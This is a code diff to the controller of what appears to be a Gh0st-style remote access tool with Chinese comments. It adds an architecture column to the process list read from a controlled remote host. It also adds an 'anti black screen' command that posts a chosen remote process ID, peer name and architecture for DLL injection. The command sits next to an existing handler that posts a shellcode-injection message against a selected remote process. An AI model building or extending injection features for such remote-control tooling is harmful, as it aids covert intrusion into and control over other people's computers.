@@ -16,6 +16,7 @@ typedef struct ItemData {
     {
         return Data[index];
     }
+    CString Arch;
 } ItemData;
 
 IMPLEMENT_DYNAMIC(CSystemDlg, CDialog)
@@ -52,6 +53,7 @@ BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
     ON_COMMAND(ID_WLIST_MAX, &CSystemDlg::OnWlistMax)
     ON_COMMAND(ID_WLIST_MIN, &CSystemDlg::OnWlistMin)
     ON_COMMAND(ID_PLIST_INJECT, &CSystemDlg::OnPlistInject)
+    ON_COMMAND(ID_PLIST_ANTI_BLACK_SCREEN, &CSystemDlg::OnPlistAntiBlackScreen)
 END_MESSAGE_MAP()
 
 
@@ -75,6 +77,7 @@ BOOL CSystemDlg::OnInitDialog()
         m_ControlList.InsertColumn(0, "映像名称", LVCFMT_LEFT, 180);
         m_ControlList.InsertColumn(1, "PID", LVCFMT_LEFT, 70);
         m_ControlList.InsertColumn(2, "程序路径", LVCFMT_LEFT, 320);
+        m_ControlList.InsertColumn(3, "架构", LVCFMT_LEFT, 70);
         ShowProcessList();   //由于第一个发送来的消息后面紧跟着进程的数据所以把数据显示到列表当中\0\0
     } else if (m_bHow==TOKEN_WSLIST) { //窗口管理初始化列表
         //初始化 窗口管理的列表
@@ -123,8 +126,8 @@ void CSystemDlg::ShowProcessList(void)
 {
     Buffer tmp = m_ContextObject->InDeCompressedBuffer.GetMyBuffer(1);
     char	*szBuffer = tmp.c_str(); //xiaoxi[][][][][]
-    char	*szExeFile;
-    char	*szProcessFullPath;
+    const char	*szExeFile;
+    const char	*szProcessFullPath;
     DWORD	dwOffset = 0;
     CString str;
     DeleteAllItems();
@@ -133,15 +136,17 @@ void CSystemDlg::ShowProcessList(void)
     for (i = 0; dwOffset < m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1; ++i) {
         LPDWORD	PID = LPDWORD(szBuffer + dwOffset);        //这里得到进程ID
         szExeFile = szBuffer + dwOffset + sizeof(DWORD);      //进程名就是ID之后的啦
+        auto arr = StringToVector(szExeFile, ':', 2);
         szProcessFullPath = szExeFile + lstrlen(szExeFile) + 1;  //完整名就是进程名之后的啦
         //他的数据结构的构建很巧妙
 
-        m_ControlList.InsertItem(i, szExeFile);       //将得到的数据加入到列表当中
+        m_ControlList.InsertItem(i, arr[0].c_str());       //将得到的数据加入到列表当中
         str.Format("%5u", *PID);
         m_ControlList.SetItemText(i, 1, str);
         m_ControlList.SetItemText(i, 2, szProcessFullPath);
+        m_ControlList.SetItemText(i, 3, arr[1].empty() ? "N/A" : arr[1].c_str());
         // ItemData 为进程ID
-        auto data = new ItemData{ *PID, {szExeFile, str, szProcessFullPath} };
+        auto data = new ItemData{ *PID, {arr[0].c_str(), str, szProcessFullPath}, arr[1].c_str() };
         m_ControlList.SetItemData(i, DWORD_PTR(data));
 
         dwOffset += sizeof(DWORD) + lstrlen(szExeFile) + lstrlen(szProcessFullPath) + 2;   //跳过这个数据结构 进入下一个循环
@@ -483,4 +488,37 @@ void CSystemDlg::OnPlistInject()
 	}
     ASSERT(m_pParent);
     m_pParent->PostMessageA(WM_INJECT_SHELLCODE, (WPARAM)new std::string(m_ContextObject->PeerName), dwProcessID);
+}
+
+
+void CSystemDlg::OnPlistAntiBlackScreen()
+{
+	CListCtrl* ListCtrl = NULL;
+	if (m_ControlList.IsWindowVisible())
+		ListCtrl = &m_ControlList;
+	else
+		return;
+
+	if (ListCtrl->GetSelectedCount() != 1)
+		::MessageBox(m_hWnd, "只能同时向一个进程进行反黑屏操作!", "提示", MB_ICONINFORMATION);
+
+	if (::MessageBox(m_hWnd, "确定要向目标进程进行反黑屏吗?\n请确保目标进程、DLL及被控端架构务必相同!",
+		"警告", MB_YESNO | MB_ICONQUESTION) == IDNO)
+		return;
+
+	DWORD	dwOffset = 1, dwProcessID = 0;
+	POSITION Pos = ListCtrl->GetFirstSelectedItemPosition();
+    CString arch;
+	if (Pos) {
+		int	nItem = ListCtrl->GetNextSelectedItem(Pos);
+		auto data = (ItemData*)ListCtrl->GetItemData(nItem);
+		dwProcessID = data->ID;
+        arch = data->Arch;
+		dwOffset += sizeof(DWORD);
+	}
+	ASSERT(m_pParent);
+    char *arg = new char[300]();
+    memcpy(arg, m_ContextObject->PeerName.c_str(), m_ContextObject->PeerName.length());
+    memcpy(arg + 256, arch, arch.GetLength());
+	m_pParent->PostMessageA(WM_ANTI_BLACKSCREEN, (WPARAM)arg, dwProcessID);
 }
